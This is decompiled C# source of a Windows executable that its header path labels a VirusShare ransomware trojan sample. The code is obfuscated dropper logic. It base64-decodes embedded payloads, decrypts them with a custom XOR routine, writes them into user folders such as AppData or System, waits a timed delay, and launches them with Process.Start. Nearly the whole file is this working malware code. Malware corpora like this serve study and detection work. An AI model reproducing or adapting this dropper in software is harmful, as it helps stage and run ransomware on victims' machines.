// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Shipping-And -Metal-Catelogue, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7BAC8275-1DFB-4218-82D4-5BA1F70D69FB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-f8b89b9cbf04cc3fe7166bc0562814777f472c5a7113f6d15b31b95fc623cb64.exe

using \u0010;
using \u0084;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0010
{
  internal sealed class \u0083\u0017
  {
    private static string[] \u0001 = new string[2]
    {
      \u0004.\u0090\u0002(93),
      \u0004.\u0090\u0002(93)
    };
    private static string[] \u0002 = new string[2]
    {
      \u0004.\u0090\u0002(106),
      \u0004.\u0090\u0002(106)
    };
    private static string[] \u0003 = new string[2]
    {
      \u0004.\u0090\u0002(111),
      \u0004.\u0090\u0002(128)
    };
    private static string[] \u0004 = new string[2]
    {
      \u0004.\u0090\u0002(137),
      \u0004.\u0090\u0002(69321)
    };

    [STAThread]
    public static void \u008D\u000F()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 1;
label_1:
        int num3 = 2;
        int upperBound1 = \u0083\u0017.\u0001.GetUpperBound(0);
        int index1 = 0;
        goto label_13;
label_2:
        num3 = 3;
        string Left = \u0083\u0017.\u0001[index1];
label_3:
        num3 = 6;
        if (Operators.CompareString(Left, \u0004.\u0090\u0002(93), false) != 0)
          goto label_5;
label_4:
        num3 = 7;
        \u0083\u0017.\u0001[index1] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        goto label_12;
label_5:
        num3 = 9;
        if (Operators.CompareString(Left, \u0004.\u0090\u0002(313957), false) != 0)
          goto label_7;
label_6:
        num3 = 10;
        \u0083\u0017.\u0001[index1] = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
        goto label_12;
label_7:
        num3 = 12;
        if (Operators.CompareString(Left, \u0004.\u0090\u0002(313970), false) != 0)
          goto label_9;
label_8:
        num3 = 13;
        \u0083\u0017.\u0001[index1] = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        goto label_12;
label_9:
        num3 = 15;
        if (Operators.CompareString(Left, \u0004.\u0090\u0002(313987), false) != 0)
          goto label_11;
label_10:
        num3 = 16;
        \u0083\u0017.\u0001[index1] = Environment.GetFolderPath(Environment.SpecialFolder.System);
        goto label_12;
label_11:
        num3 = 19;
        \u0083\u0017.\u0001[index1] = \u0083\u0017.\u0001[index1];
label_12:
        num3 = 21;
        checked { ++index1; }
label_13:
        if (index1 <= upperBound1)
          goto label_2;
label_14:
        num3 = 22;
        int upperBound2 = \u0083\u0017.\u0004.GetUpperBound(0);
        int index2 = 0;
        goto label_21;
label_15:
        num3 = 23;
        byte[] bytes = \u0083\u0017.\u0086\u0017(Convert.FromBase64String(\u0083\u0017.\u0004[index2]), \u0004.\u0090\u0002(313996));
label_16:
        num3 = 24;
        string str = \u0083\u0017.\u0001[index2] + \u0004.\u0090\u0002(314009) + \u0083\u0017.\u0003[index2];
label_17:
        num3 = 25;
        File.WriteAllBytes(str, bytes);
label_18:
        num3 = 26;
        \u0083\u0017.\u0084\u0017(checked ((int) Math.Round(unchecked (Conversions.ToDouble(\u0083\u0017.\u0002[index2]) * 1000.0 * 60.0))));
label_19:
        num3 = 27;
        Process.Start(str);
label_20:
        num3 = 28;
        checked { ++index2; }
label_21:
        if (index2 <= upperBound2)
          goto label_15;
        else
          goto label_28;
label_23:
        num1 = num3;
        switch (num2)
        {
          case 1:
            int num4 = num1 + 1;
            num1 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
              case 8:
              case 11:
              case 14:
              case 17:
              case 20:
              case 21:
                goto label_12;
              case 5:
              case 6:
                goto label_3;
              case 7:
                goto label_4;
              case 9:
                goto label_5;
              case 10:
                goto label_6;
              case 12:
                goto label_7;
              case 13:
                goto label_8;
              case 15:
                goto label_9;
              case 16:
                goto label_10;
              case 18:
              case 19:
                goto label_11;
              case 22:
                goto label_14;
              case 23:
                goto label_15;
              case 24:
                goto label_16;
              case 25:
                goto label_17;
              case 26:
                goto label_18;
              case 27:
                goto label_19;
              case 28:
                goto label_20;
              case 29:
                goto label_28;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_23;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_28:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private static void \u0084\u0017([In] int obj0)
    {
      Stopwatch stopwatch1 = new Stopwatch();
      Stopwatch stopwatch2;
      if (true)
        stopwatch2 = stopwatch1;
      stopwatch2.Start();
      while (stopwatch2.ElapsedMilliseconds < (long) obj0)
        Application.DoEvents();
      stopwatch2.Stop();
    }

    public static byte[] \u0086\u0017([In] byte[] obj0, [In] string obj1)
    {
      byte[] bytes = Encoding.Default.GetBytes(obj1);
      int num1 = (int) obj0[checked (obj0.Length - 1)] ^ 112;
      byte[] arySrc = new byte[checked (obj0.Length + 1)];
      int num2 = checked (obj0.Length - 1);
      int index1 = 0;
      while (index1 <= num2)
      {
        int index2;
        arySrc[index1] = checked ((byte) ((int) obj0[index1] ^ num1 ^ (int) bytes[index2]));
        if (index2 == checked (obj1.Length - 1))
          index2 = 0;
        else
          checked { ++index2; }
        checked { ++index1; }
      }
      return (byte[]) Utils.CopyArray((Array) arySrc, (Array) new byte[checked (obj0.Length - 2 + 1)]);
    }
  }
}
